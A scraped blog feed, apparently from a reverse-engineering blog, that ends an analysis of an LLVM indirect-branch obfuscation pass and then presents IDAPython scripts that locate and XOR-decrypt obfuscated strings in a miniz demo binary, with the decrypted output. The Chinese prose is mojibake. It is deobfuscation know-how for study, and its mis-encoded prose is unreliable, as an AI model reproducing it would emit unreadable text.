\u0026amp;\u0026amp; BI-\u0026gt;isConditional()) { //åˆ¤æ–­åŸºæœ¬å—ç»“å°¾æ˜¯å¦æ˜¯æ¡ä»¶è·³è½¬æŒ‡ä»¤ IRBuilder\u0026lt;\u0026gt; IRB(BI); //è·å–IRä»£ç çš„æ„é€ å™¨ Value *Cond = BI-\u0026gt;getCondition(); //è·å–è·³è½¬çš„æ¡ä»¶ Value *Idx; Value *TIdx, *FIdx; TIdx = ConstantInt::get(intType, BBNumbering[BI-\u0026gt;getSuccessor(0)]); //è·å–ä½¿å¾—æ¡ä»¶ä¸ºçœŸçš„åç»§å—çš„ç¼–å· FIdx = ConstantInt::get(intType, BBNumbering[BI-\u0026gt;getSuccessor(1)]); //è·å–ä½¿å¾—æ¡ä»¶ä¸ºå‡çš„åç»§å—çš„ç¼–å· Idx = IRB.CreateSelect(Cond, TIdx, FIdx); //æ„é€ CSELæŒ‡ä»¤ Value *GEP = IRB.CreateGEP(DestBBs-\u0026gt;getValueType(), DestBBs,{Zero, Idx});//è®¡ç®—æ•°ç»„å…ƒç´ åœ°å€(DestBBs(Idx)) Value *EncDestAddr = IRB.CreateLoad( //å–å‡ºåŠ å¯†åçš„ç›®æ ‡åœ°å€ GEP-\u0026gt;getType(), GEP, \u0026#34;EncDestAddr\u0026#34;); // -EncKey = X - FuncSecret Value *DecKey = EncKey; if (GXorKey) { LoadInst *XorKey = IRB.CreateLoad(GXorKey-\u0026gt;getValueType(), GXorKey); if (opt.level() == 1) { //ç”Ÿæˆlevel 1å¯¹åº”çš„è§£å¯†å¯†é’¥ DecKey = IRB.CreateXor(EncKey1, XorKey); DecKey = IRB.CreateNeg(DecKey); } else if (opt.level() == 2) { //ç”Ÿæˆlevel 2å¯¹åº”çš„è§£å¯†å¯†é’¥ DecKey = IRB.CreateXor(EncKey1, IRB.CreateMul(XorKey, Idx)); DecKey = IRB.CreateNeg(DecKey); } } if (XorKeys) { //ç”Ÿæˆlevel 3å¯¹åº”çš„è§£å¯†å¯†é’¥ Value *XorKeysGEP = IRB.CreateGEP(XorKeys-\u0026gt;getValueType(), XorKeys, {Zero, Idx}); Value *XorKey = IRB.CreateLoad(intType, XorKeysGEP); XorKey = IRB.CreateNeg(XorKey); XorKey = IRB.CreateXor(XorKey, EncKey1); XorKey = IRB.CreateNeg(XorKey); DecKey = IRB.CreateXor(EncKey1, IRB.CreateMul(XorKey, Idx)); DecKey = IRB.CreateNeg(DecKey); } Value *DestAddr = IRB.CreateGEP( Type::getInt8Ty(Ctx), EncDestAddr, DecKey); //è®¡ç®—ç›®æ ‡åŸºæœ¬å—çš„åœ°å€ IndirectBrInst *IBI = IndirectBrInst::Create(DestAddr, 2); //ç”ŸæˆBRæŒ‡ä»¤ IBI-\u0026gt;addDestination(BI-\u0026gt;getSuccessor(0)); //é¢„å…ˆæ·»åŠ å¯èƒ½è·³è½¬çš„æ‰€æœ‰ç›®æ ‡ IBI-\u0026gt;addDestination(BI-\u0026gt;getSuccessor(1)); //è¿™é‡Œå³å½“å‰å—çš„ä¸¤ä¸ªåç»§(å› ä¸ºæ˜¯æ¡ä»¶è·³è½¬) ReplaceInstWithInst(BI, IBI); } } å¤§æ¦‚çš„è¿‡ç¨‹å°±æ˜¯å¦‚ä¸‹æ‰€ç¤º(AIç”Ÿæˆ)ï¼š\næ€»ç»“ Hakariçš„é—´æ¥è·³è½¬æ··æ·†å¢åŠ äº†ä¸åŒçš„æ··æ·†å¼ºåº¦ï¼Œå°¤å…¶æ˜¯Level 3çš„æ··æ·†ï¼Œå¯¹å¯†é’¥åšäº†è¿›ä¸€æ­¥æ··æ·†ï¼Œä½¿å¾—é€šè¿‡åŸå§‹è®¡ç®—å¯†é’¥æ¥æ¢å¤å‡½æ•°çš„æ§åˆ¶æµå˜å¾—æ›´åŠ å›°éš¾ï¼Œå¦‚æœæƒ³æ›´åŠ å®Œç¾çš„è§£å†³æ··æ·†ï¼Œç”¨Angrå¼ºåˆ¶ç¨‹åºèµ°ä¸åŒåˆ†æ”¯ä¹Ÿè®¸ä¼šæ›´åŠ åˆé€‚\n","date":"2025-03-11T00:00:00Z","image":"https://jeremiah.oss-cn-shenzhen.aliyuncs.com/picture/202503111932617.png","permalink":"http://www.j3r3m14h.com.cn/Je2em1ah_blog/p/arkari%E9%97%B4%E6%8E%A5%E8%B7%B3%E8%BD%AC%E6%B7%B7%E6%B7%86%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/","title":"Arkarié—´æ¥è·³è½¬æ··æ·†æºç åˆ†æ"},{"content":"å‰è¨€ åœ¨å­¦ä¹ Angrå»æ··æ·†çš„æ—¶å€™å­¦åˆ°äº†å»é™¤å­—ç¬¦ä¸²æ··æ·†ï¼Œäºæ˜¯æ‰¾äº†ä¸ªdemoæ¥æµ‹è¯•ä¸€ä¸‹å­¦ä¹ å¾—æ€ä¹ˆæ ·ï¼Œæœ¬æ–‡ä¸»è¦è¿˜æ˜¯ä½¿ç”¨IDAPythonæ¥é™æ€å»é™¤å­—ç¬¦ä¸²æ··æ·†ï¼Œdemoä¸­æœ‰å¤šä¸ªå­—ç¬¦ä¸²è§£å¯†å‡½æ•°ï¼Œä½¿ç”¨çš„æ–¹æ³•æ˜¯é€šè¿‡åŒ¹é…è§£å¯†å‡½æ•°ç‰¹å¾ï¼Œæ‰¹é‡å®šä½è§£å¯†å‡½æ•°å¹¶è·å–å¯¹åº”çš„dataå’Œkeyè¿›è¡Œè§£å¯†\ndemoä»“åº“:Jeremiah-gdut/obf-demo\ndemo: goron-cse-miniz-example3\nTODO å®ç°è§£å¯†ç»“æœç›´æ¥patchåˆ°å¯¹åº”å˜é‡ æ­£åˆ™è¡¨è¾¾å¼ è§£å†³è¿™ä¸ªdemoçš„å­—ç¬¦ä¸²æ··æ·†ç”¨åˆ°äº†æ­£åˆ™è¡¨è¾¾å¼ï¼Œä¹‹å‰å¹¶æ²¡æœ‰å­¦ä¹ è¿‡è¿™ä¸ªå†…å®¹ï¼Œæ‰€ä»¥è®°å½•ä¸€ä¸‹æ­£åˆ™è¡¨è¾¾å¼çš„çŸ¥è¯†ç‚¹\næ­£åˆ™è¡¨è¾¾å¼ï¼ˆRegular Expressionï¼Œç®€ç§° Regexï¼‰æ˜¯ä¸€ç§ç”¨äºæè¿°å­—ç¬¦ä¸²åŒ¹é…è§„åˆ™çš„æ–‡æœ¬æ¨¡å¼ã€‚å®ƒé€šè¿‡ç‰¹å®šçš„è¯­æ³•è§„åˆ™ï¼Œå¯ä»¥é«˜æ•ˆåœ°å®ç°æ–‡æœ¬çš„æœç´¢ã€åŒ¹é…ã€æ›¿æ¢å’Œæå–æ“ä½œã€‚åœ¨æ–‡æœ¬ç‰¹å¾åŒ¹é…ä¸­ï¼Œæ­£åˆ™è¡¨è¾¾å¼èƒ½å¿«é€Ÿå®šä½ç¬¦åˆç‰¹å®šæ¨¡å¼çš„å†…å®¹ï¼ˆå¦‚é‚®ç®±ã€ç”µè¯å·ç ã€æ—¥æœŸç­‰ï¼‰ï¼Œæ˜¯å¤„ç†æ–‡æœ¬æ•°æ®çš„æ ¸å¿ƒå·¥å…·ä¹‹ä¸€ã€‚\nä¸€ã€æ­£åˆ™è¡¨è¾¾å¼æ ¸å¿ƒè¯­æ³• æ­£åˆ™è¡¨è¾¾å¼ç”±æ™®é€šå­—ç¬¦ï¼ˆå¦‚å­—æ¯ã€æ•°å­—ï¼‰å’Œå…ƒå­—ç¬¦ï¼ˆç‰¹æ®Šç¬¦å·ï¼‰ç»„æˆï¼Œä»¥ä¸‹æ˜¯å…³é”®è¯­æ³•å…ƒç´ ï¼š\n1. åŸºç¡€å…ƒå­—ç¬¦ å…ƒå­—ç¬¦ ä½œç”¨ ç¤ºä¾‹ . åŒ¹é…ä»»æ„å•ä¸ªå­—ç¬¦ï¼ˆé™¤æ¢è¡Œç¬¦ï¼‰ a.cÂ â†’ \u0026ldquo;abc\u0026rdquo;, \u0026ldquo;a3c\u0026rdquo; ^ åŒ¹é…å­—ç¬¦ä¸²å¼€å¤´ ^startÂ â†’ åŒ¹é…ä»¥ \u0026ldquo;start\u0026rdquo; å¼€å¤´çš„è¡Œ $ åŒ¹é…å­—ç¬¦ä¸²ç»“å°¾ end$Â â†’ åŒ¹é…ä»¥ \u0026ldquo;end\u0026rdquo; ç»“å°¾çš„è¡Œ \\d åŒ¹é…æ•°å­—ï¼ˆç­‰ä»·äºÂ [0-9]ï¼‰ \\d{3}Â â†’ \u0026ldquo;123\u0026rdquo; \\w åŒ¹é…å­—æ¯ã€æ•°å­—æˆ–ä¸‹åˆ’çº¿ \\w+Â â†’ \u0026ldquo;user123\u0026rdquo; \\s åŒ¹é…ç©ºç™½å­—ç¬¦ï¼ˆç©ºæ ¼ã€åˆ¶è¡¨ç¬¦ç­‰ï¼‰ \\s+Â â†’ åŒ¹é…è¿ç»­ç©ºæ ¼ 2. é‡è¯ï¼ˆæ§åˆ¶é‡å¤æ¬¡æ•°ï¼‰ é‡è¯ ä½œç”¨ ç¤ºä¾‹ * åŒ¹é…å‰ä¸€ä¸ªå…ƒç´  0 æ¬¡æˆ–å¤šæ¬¡ ab*cÂ â†’ \u0026ldquo;ac\u0026rdquo;, \u0026ldquo;abbc\u0026rdquo; + åŒ¹é…å‰ä¸€ä¸ªå…ƒç´  1 æ¬¡æˆ–å¤šæ¬¡ a+bÂ â†’ \u0026ldquo;ab\u0026rdquo;, \u0026ldquo;aaab\u0026rdquo; ? åŒ¹é…å‰ä¸€ä¸ªå…ƒç´  0 æ¬¡æˆ– 1 æ¬¡ colou?rÂ â†’ \u0026ldquo;color\u0026rdquo; æˆ– \u0026ldquo;colour\u0026rdquo; {n} ç²¾ç¡®åŒ¹é…å‰ä¸€ä¸ªå…ƒç´  n æ¬¡ \\d{4}Â â†’ \u0026ldquo;2023\u0026rdquo; {n,m} åŒ¹é…å‰ä¸€ä¸ªå…ƒç´  n åˆ° m æ¬¡ a{2,4}Â â†’ \u0026ldquo;aa\u0026rdquo;, \u0026ldquo;aaaa\u0026rdquo; 3. å­—ç¬¦ç±»ä¸åˆ†ç»„ è¯­æ³• ä½œç”¨ ç¤ºä¾‹ [abc] åŒ¹é…æ‹¬å·å†…çš„ä»»æ„å­—ç¬¦ [aeiou]Â â†’ åŒ¹é…ä»»æ„å…ƒéŸ³å­—æ¯ [^abc] åŒ¹é…ä¸åœ¨æ‹¬å·å†…çš„ä»»æ„å­—ç¬¦ [^0-9]Â â†’ åŒ¹é…éæ•°å­—å­—ç¬¦ (abc) åˆ†ç»„ï¼Œæ•è·åŒ¹é…çš„å†…å®¹ (ab)+Â â†’ åŒ¹é… \u0026ldquo;abab\u0026rdquo; (è½¬ä¹‰)| é€»è¾‘â€œæˆ–â€ cat | dog â†’ åŒ¹é… \u0026ldquo;cat\u0026rdquo; æˆ– \u0026ldquo;dog\u0026rdquo; 4. è½¬ä¹‰å­—ç¬¦ ç¬¦å· ä½œç”¨ \\ è½¬ä¹‰ç‰¹æ®Šå­—ç¬¦ï¼ˆå¦‚Â \\.Â åŒ¹é…çœŸæ­£çš„ç‚¹å·ï¼‰ \\b åŒ¹é…å•è¯è¾¹ç•Œï¼ˆå¦‚Â \\bword\\bÂ åŒ¹é…ç‹¬ç«‹çš„ \u0026ldquo;word\u0026rdquo;ï¼‰ ä½¿ç”¨åˆ°çš„IDA API idautils.Functions() è¿™ä¸ªIDAçš„APIè¿”å›å‡½æ•°åœ°å€çš„åˆ—è¡¨ idaapi.decompile(func_ea) è¿™ä¸ªAPIå¯ä»¥è·å–åˆ°func_eaåœ°å€å¤„çš„å‡½æ•°çš„åç¼–è¯‘ä»£ç  idautils.XrefsTo(funcaddr) è·å–å½“å‰åœ°å€çš„äº¤å‰å¼•ç”¨ idc.get_func_name(funcaddr) è·å–å½“å‰åœ°å€çš„å‡½æ•°å(ç¬¦å·) idaapi.get_bytes(addr, length) è·å–addrå¤„lengthä¸ªå­—èŠ‚çš„æ•°æ® åˆ†ædemoè§£å¯†å‡½æ•°çš„ç‰¹å¾ åŸºæœ¬ä¸Šæ‰€æœ‰çš„å­—ç¬¦ä¸²è§£å¯†å‡½æ•°éƒ½é•¿è¿™ä¸ªæ ·ï¼Œåªæœ‰keyçš„é•¿åº¦å’Œdataçš„é•¿åº¦ä¸ä¸€æ ·ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦æ‰¾å‡ºè§£å¯†å‡½æ•°çš„å…±åŒç‰¹å¾\nç‰¹å¾åˆ†æ ä¸»è¦æå–åç¼–è¯‘ä»£ç ä¸­çš„å­—ç¬¦ä¸²\n^ *, ++, while, != 1, % äºæ˜¯å¯ä»¥å†™å‡ºå¯¹åº”çš„æŸ¥æ‰¾å‡½æ•°find_all_encode\nreturn : åŠ å¯†å‡½æ•°åœ°å€çš„åˆ—è¡¨ 1 2 3 4 5 6 7 8 9 10 11 12 13 import idaapi import idautils def find_all_encode(): \u0026#39;\u0026#39;\u0026#39; find all encode function \u0026#39;\u0026#39;\u0026#39; func_addr = [] for func in idautils.Functions(): features = [\u0026#39;^ *\u0026#39;, \u0026#39;!= 1\u0026#39;, \u0026#39;++\u0026#39;, \u0026#39;%\u0026#39;, \u0026#39;while\u0026#39;] func_code = str(idaapi.decompile(func)) if all(feature in func_code for feature in features): func_addr.append(func) return func_addr æå–å¯†æ–‡åŠå¯†é’¥é•¿åº¦ ç®€å•åˆ†æå‡½æ•°ä¹‹åå¯ä»¥å‘ç°å¯†æ–‡åŠå¯†é’¥çš„é•¿åº¦ä½ç½®æ˜¯å›ºå®šçš„ï¼Œå› æ­¤å¯ä»¥é€šè¿‡ç‰¹å¾åŒ¹é…æ¥æå–ä¸¤è€…çš„é•¿åº¦\n*(a2 + v2 % 0x10u) : % åé¢æ˜¯å¯†é’¥çš„é•¿åº¦key_length while ( v2 != 50 ) : whileå¾ªç¯ä¸­çš„åˆ¤å®šæ¡ä»¶æ˜¯å¯†æ–‡çš„é•¿åº¦data_length å¯†æ–‡å’Œå¯†é’¥åœ¨åŒä¸€ä¸ªå…¨å±€å˜é‡ä¸­,å‰key_lengthä¸ªå­—èŠ‚æ˜¯å¯†é’¥ï¼Œåé¢æ˜¯å¯†æ–‡ é‚£ä¹ˆå¯ä»¥ç”¨æ­£åˆ™è¡¨è¾¾å¼åŒ¹é…å¯¹åº”çš„å­—ç¬¦ä¸²å†™å‡ºå¯¹åº”çš„æå–å‡½æ•°extract\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 import re def search_key_length(text): \u0026#39;\u0026#39;\u0026#39; search keylength \u0026#39;\u0026#39;\u0026#39; pattern = r\u0026#34;%[\\s]*(0x[0-9a-fA-F]+|\\d+)\u0026#34; length = re.search(pattern, str(text)) if length: val = length.group(1) if val.startswith(\u0026#39;0x\u0026#39;): return int(val, 16) else: return int(val) return None def search_data_length(text): \u0026#39;\u0026#39;\u0026#39; search data length \u0026#39;\u0026#39;\u0026#39; pattern = r\u0026#34;while\\s*\\([^)]*!=\\s*((?:0x[0-9a-fA-F]+)|\\d+)[^)]*\\)\u0026#34; length = re.search(pattern, str(text)) if length: val = length.group(1) if val.startswith(\u0026#39;0x\u0026#39;): return int(val, 16) else: return int(val) return None def extract(funcaddr): \u0026#39;\u0026#39;\u0026#39; extract data and key \u0026#39;\u0026#39;\u0026#39; funccode = str(idaapi.decompile(funcaddr)) for line in funccode.split(\u0026#39;\\n\u0026#39;): if \u0026#39;while\u0026#39; in line: datalen = search_data_length(line) if \u0026#39;%\u0026#39; in line: keylen = search_key_length(line) return keylen, datalen å®šä½å…¨å±€å˜é‡çš„åœ°å€ å‰é¢æˆ‘ä»¬åˆ†æäº†å¯†æ–‡å’Œå¯†é’¥çš„é•¿åº¦ï¼Œä¸ºäº†èƒ½å¤Ÿè‡ªåŠ¨åŒ–æ‰¹é‡è§£å¯†å­—ç¬¦ä¸²ï¼Œæˆ‘ä»¬è¿˜éœ€è¦æ‰¾åˆ°å­˜å‚¨å¯†æ–‡çš„åœ°å€å’Œè§£å¯†åå¯†æ–‡çš„åœ°å€ï¼Œæœ‰äº†IDAæä¾›çš„APIæˆ‘ä»¬å¯ä»¥å¾ˆè½»æ¾çš„æ‰¾åˆ°å¯¹åº”çš„ä½ç½®ã€‚\næ€è·¯ å¯¹find_all_encodeå‡½æ•°ä¸­å¾—åˆ°çš„åŠ å¯†å‡½æ•°çš„åœ°å€è¿›è¡Œäº¤å‰å¼•ç”¨ï¼Œå¾—åˆ°è°ƒç”¨å¤„çš„åœ°å€ è§£æè°ƒç”¨å¤„çš„æ–‡æœ¬ï¼Œé€šè¿‡æ­£åˆ™åŒ¹é…æå–å¯¹åº”å…¨å±€å˜é‡çš„åœ°å€ï¼Œå¦‚ä¸‹å›¾ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 import idc def Xref_to_data_and_key(funcaddr, N=2): \u0026#39;\u0026#39;\u0026#39; find xref to data and key \u0026#39;\u0026#39;\u0026#39; xrefs = [ref.frm for ref in idautils.XrefsTo(funcaddr)] funcname = idc.get_func_name(funcaddr) result = [] for xref in xrefs: dec = idaapi.decompile(xref) if dec is None: continue dec_str = str(dec) lines = dec_str.split(\u0026#39;\\n\u0026#39;) call_line = [i for i, line in enumerate(lines) if funcname in line] for line in call_line: context = lines[max(0, line-N):min(len(lines), line+N+1)] context = \u0026#39;\\n\u0026#39;.join(context) result.append((xref, context)) return result def match_hex(text): \u0026#39;\u0026#39;\u0026#39; match hex \u0026#39;\u0026#39;\u0026#39; pattern = r\u0026#34;_([0-9a-fA-F]+)\u0026#34; match = re.search(pattern, text) if match: return match.group(1) return None def extract_addr(funcaddr): \u0026#39;\u0026#39;\u0026#39; extract data and key address \u0026#39;\u0026#39;\u0026#39; context = Xref_to_data_and_key(funcaddr, 0)[0][1] context = context[context.find(\u0026#39;(\u0026#39;): context.rfind(\u0026#39;)\u0026#39;) + 1].split(\u0026#39;,\u0026#39;) if len(context) != 2: print(\u0026#34;error: \u0026#34;, context) return None dst_addr = int(match_hex(context[0]), 16) data_addr = int(match_hex(context[1]), 16) return dst_addr, data_addr æ¨¡æ‹Ÿè§£å¯†å‡½æ•° æ¯”è¾ƒç®€å•ï¼Œä¸å¤šè¯´\n1 2 3 4 5 6 7 8 9 def decrypt(data, key): \u0026#39;\u0026#39;\u0026#39; decrypt data \u0026#39;\u0026#39;\u0026#39; data = bytearray(data) key = bytearray(key) for i in range(len(data)): data[i] ^= key[i % len(key)] return bytes(data) å®Œæ•´å®ç° 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 import idaapi import idautils import idc import re def find_all_encode(): \u0026#39;\u0026#39;\u0026#39; find all encode function \u0026#39;\u0026#39;\u0026#39; func_addr = [] for func in idautils.Functions(): features = [\u0026#39;^ *\u0026#39;, \u0026#39;!= 1\u0026#39;, \u0026#39;++\u0026#39;, \u0026#39;%\u0026#39;, \u0026#39;while\u0026#39;] func_code = str(idaapi.decompile(func)) if all(feature in func_code for feature in features): func_addr.append(func) return func_addr def search_key_length(text): \u0026#39;\u0026#39;\u0026#39; search keylength \u0026#39;\u0026#39;\u0026#39; pattern = r\u0026#34;%[\\s]*(0x[0-9a-fA-F]+|\\d+)\u0026#34; length = re.search(pattern, str(text)) if length: val = length.group(1) if val.startswith(\u0026#39;0x\u0026#39;): return int(val, 16) else: return int(val) return None def search_data_length(text): \u0026#39;\u0026#39;\u0026#39; search data length \u0026#39;\u0026#39;\u0026#39; pattern = r\u0026#34;while\\s*\\([^)]*!=\\s*((?:0x[0-9a-fA-F]+)|\\d+)[^)]*\\)\u0026#34; length = re.search(pattern, str(text)) if length: val = length.group(1) if val.startswith(\u0026#39;0x\u0026#39;): return int(val, 16) else: return int(val) return None def extract(funcaddr): \u0026#39;\u0026#39;\u0026#39; extract data and key \u0026#39;\u0026#39;\u0026#39; funccode = str(idaapi.decompile(funcaddr)) for line in funccode.split(\u0026#39;\\n\u0026#39;): if \u0026#39;while\u0026#39; in line: datalen = search_data_length(line) if \u0026#39;%\u0026#39; in line: keylen = search_key_length(line) return keylen, datalen def Xref_to_data_and_key(funcaddr, N=2): \u0026#39;\u0026#39;\u0026#39; find xref to data and key \u0026#39;\u0026#39;\u0026#39; xrefs = [ref.frm for ref in idautils.XrefsTo(funcaddr)] funcname = idc.get_func_name(funcaddr) result = [] for xref in xrefs: dec = idaapi.decompile(xref) if dec is None: continue dec_str = str(dec) lines = dec_str.split(\u0026#39;\\n\u0026#39;) call_line = [i for i, line in enumerate(lines) if funcname in line] for line in call_line: context = lines[max(0, line-N):min(len(lines), line+N+1)] context = \u0026#39;\\n\u0026#39;.join(context) result.append((xref, context)) return result def match_hex(text): \u0026#39;\u0026#39;\u0026#39; match hex \u0026#39;\u0026#39;\u0026#39; pattern = r\u0026#34;_([0-9a-fA-F]+)\u0026#34; match = re.search(pattern, text) if match: return match.group(1) return None def extract_addr(funcaddr): \u0026#39;\u0026#39;\u0026#39; extract data and key address \u0026#39;\u0026#39;\u0026#39; context = Xref_to_data_and_key(funcaddr, 0)[0][1] context = context[context.find(\u0026#39;(\u0026#39;): context.rfind(\u0026#39;)\u0026#39;) + 1].split(\u0026#39;,\u0026#39;) if len(context) != 2: print(\u0026#34;error: \u0026#34;, context) return None dst_addr = int(match_hex(context[0]), 16) data_addr = int(match_hex(context[1]), 16) return dst_addr, data_addr def decrypt(data, key): \u0026#39;\u0026#39;\u0026#39; decrypt data \u0026#39;\u0026#39;\u0026#39; data = bytearray(data) key = bytearray(key) for i in range(len(data)): data[i] ^= key[i % len(key)] return bytes(data) def decrypt_all(): \u0026#39;\u0026#39;\u0026#39; decrypt all data \u0026#39;\u0026#39;\u0026#39; funcs = find_all_encode() for func in funcs: try: keylength, datalength = extract(func) dst_addr, data_addr = extract_addr(func) keydata = idaapi.get_bytes(data_addr, keylength) data = idaapi.get_bytes(data_addr + keylength, datalength) decrypt_data = decrypt(data, keydata) print(f\u0026#39;addr: {hex(dst_addr)}\u0026#39;, decrypt_data) except Exception as e: print(f\u0026#39;error: {hex(func)}\u0026#39;) decrypt_all() æœ€ç»ˆæ•ˆæœ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 addr: 0x2f0a8 b\u0026#39;11.0.2\\x00\u0026#39; addr: 0x2f158 b\u0026#39;miniz.c\\x00\u0026#39; addr: 0x2f164 b\u0026#39;tdefl_status tdefl_compress_buffer(tdefl_compressor *, const void *, size_t, tdefl_flush)\\x00\u0026#39; addr: 0x2f1c4 b\u0026#39;d-\u0026gt;m_pPut_buf_func\\x00\u0026#39; addr: 0x2f1dc b\u0026#39;\\x05\\x05\\x04\\x00\u0026#39; addr: 0x2f1e4 b\u0026#39;\\x02\\x03\\x07\\x00\u0026#39; addr: 0x2f1ec b\u0026#39;\\x03\\x03\\x0b\\x00\u0026#39; addr: 0x2f1f4 b\u0026#39;tinfl_status tinfl_decompress(tinfl_decompressor *, const mz_uint8 *, size_t *, mz_uint8 *, mz_uint8 *, size_t *, const mz_uint32)\\x00\u0026#39; addr: 0x2f27c b\u0026#39;!num_bits\\x00\u0026#39; addr: 0x2f28c b\u0026#39;rb\\x00\u0026#39; addr: 0x2f294 b\u0026#39;wb\\x00\u0026#39; addr: 0x2f29c b\u0026#39;w+b\\x00\u0026#39; addr: 0x2f2a4 b\u0026#39;r+b\\x00\u0026#39; addr: 0x2f2ac b\u0026#39;mz_bool mz_zip_writer_add_mem_ex_v2(mz_zip_archive *, const char *, const void *, size_t, const void *, mz_uint16, mz_uint, mz_uint64, mz_uint32, time_t *, const char *, mz_uint, const char *, mz_uint)\\x00\u0026#39; addr: 0x2f37c b\u0026#39;(local_dir_header_ofs \u0026amp; (pZip-\u0026gt;m_file_offset_alignment - 1)) == 0\\x00\u0026#39; addr: 0x2f3c4 b\u0026#39;bit_flags \u0026amp; MZ_ZIP_LDH_BIT_FLAG_HAS_LOCATOR\\x00\u0026#39; addr: 0x2f3f4 b\u0026#39;mz_bool mz_zip_writer_add_read_buf_callback(mz_zip_archive *, const char *, mz_file_read_func, void *, mz_uint64, const time_t *, const void *, mz_uint16, mz_uint, const char *, mz_uint, const char *, mz_uint)\\x00\u0026#39; addr: 0x2f4cc b\u0026#39;(cur_archive_file_ofs \u0026amp; (pZip-\u0026gt;m_file_offset_alignment - 1)) == 0\\x00\u0026#39; addr: 0x2f514 b\u0026#39;mz_bool mz_zip_writer_add_from_zip_reader(mz_zip_archive *, mz_zip_archive *, mz_uint)\\x00\u0026#39; addr: 0x2f570 b\u0026#39;no error\\x00\u0026#39; addr: 0x2f580 b\u0026#39;undefined error\\x00\u0026#39; addr: 0x2f594 b\u0026#39;too many files\\x00\u0026#39; addr: 0x2f5a8 b\u0026#39;file too large\\x00\u0026#39; addr: 0x2f5bc b\u0026#39;unsupported method\\x00\u0026#39; addr: 0x2f5d4 b\u0026#39;unsupported encryption\\x00\u0026#39; addr: 0x2f5f0 b\u0026#39;unsupported feature\\x00\u0026#39; addr: 0x2f608 b\u0026#39;failed finding central directory\\x00\u0026#39; addr: 0x2f630 b\u0026#39;not a ZIP archive\\x00\u0026#39; addr: 0x2f648 b\u0026#39;invalid header or archive is corrupted\\x00\u0026#39; addr: 0x2f674 b\u0026#39;unsupported multidisk archive\\x00\u0026#39; addr: 0x2f698 b\u0026#39;decompression failed or archive is corrupted\\x00\u0026#39; addr: 0x2f6cc b\u0026#39;compression failed\\x00\u0026#39; addr: 0x2f6e4 b\u0026#39;unexpected decompressed size\\x00\u0026#39; addr: 0x2f708 b\u0026#39;CRC-32 check failed\\x00\u0026#39; addr: 0x2f720 b\u0026#39;unsupported central directory size\\x00\u0026#39; addr: 0x2f748 b\u0026#39;allocation failed\\x00\u0026#39; addr: 0x2f760 b\u0026#39;file open failed\\x00\u0026#39; addr: 0x2f778 b\u0026#39;file create failed\\x00\u0026#39; addr: 0x2f790 b\u0026#39;file write failed\\x00\u0026#39; addr: 0x2f7a8 b\u0026#39;file read failed\\x00\u0026#39; addr: 0x2f7c0 b\u0026#39;file close failed\\x00\u0026#39; addr: 0x2f7d8 b\u0026#39;file seek failed\\x00\u0026#39; addr: 0x2f7f0 b\u0026#39;file stat failed\\x00\u0026#39; addr: 0x2f808 b\u0026#39;invalid parameter\\x00\u0026#39; addr: 0x2f820 b\u0026#39;invalid filename\\x00\u0026#39; addr: 0x2f838 b\u0026#39;buffer too small\\x00\u0026#39; addr: 0x2f850 b\u0026#39;internal error\\x00\u0026#39; addr: 0x2f864 b\u0026#39;file not found\\x00\u0026#39; addr: 0x2f878 b\u0026#39;archive is too large\\x00\u0026#39; addr: 0x2f894 b\u0026#39;validation failed\\x00\u0026#39; addr: 0x2f8ac b\u0026#39;write callback failed\\x00\u0026#39; addr: 0x2f8c8 b\u0026#39;total errors\\x00\u0026#39; addr: 0x2f8dc b\u0026#39;unknown error\\x00\u0026#39; addr: 0x2f8f0 b\u0026#39;mz_bool tdefl_compress_normal(tdefl_compressor *)\\x00\u0026#39; addr: 0x2f928 b\u0026#39;d-\u0026gt;m_lookahead_size \u0026gt;= len_to_move\\x00\u0026#39; addr: 0x2f950 b\u0026#39;void tdefl_find_match(tdefl_compressor *, mz_uint, mz_uint, mz_uint, mz_uint *, mz_uint *)\\x00\u0026#39; addr: 0x2f9b0 b\u0026#39;max_match_len \u0026lt;= TDEFL_MAX_MATCH_LEN\\x00\u0026#39; addr: 0x2f9dc b\u0026#39;void tdefl_record_match(tdefl_compressor *, mz_uint, mz_uint)\\x00\u0026#39; addr: 0x2fa20 b\u0026#39;(match_len \u0026gt;= TDEFL_MIN_MATCH_LEN) \u0026amp;\u0026amp; (match_dist \u0026gt;= 1) \u0026amp;\u0026amp; (match_dist \u0026lt;= TDEFL_LZ_DICT_SIZE)\\x00\u0026#39; addr: 0x2fa84 b\u0026#39;int tdefl_flush_block(tdefl_compressor *, int)\\x00\u0026#39; addr: 0x2fab8 b\u0026#39;!d-\u0026gt;m_output_flush_remaining\\x00\u0026#39; addr: 0x2fadc b\u0026#39;bits \u0026lt;= ((1U \u0026lt;\u0026lt; len) - 1U)\\x00\u0026#39; addr: 0x2fafc b\u0026#39;d-\u0026gt;m_pOutput_buf \u0026lt; d-\u0026gt;m_pOutput_buf_end\\x00\u0026#39; error: 0x26b58 addr: 0x2fb60 b\u0026#39;void tdefl_start_dynamic_block(tdefl_compressor *)\\x00\u0026#39; addr: 0x2fb98 b\u0026#39;code \u0026lt; TDEFL_MAX_HUFF_SYMBOLS_2\\x00\u0026#39; addr: 0x2fbbc b\u0026#39;mz_bool tdefl_compress_lz_codes(tdefl_compressor *)\\x00\u0026#39; addr: 0x2fbf4 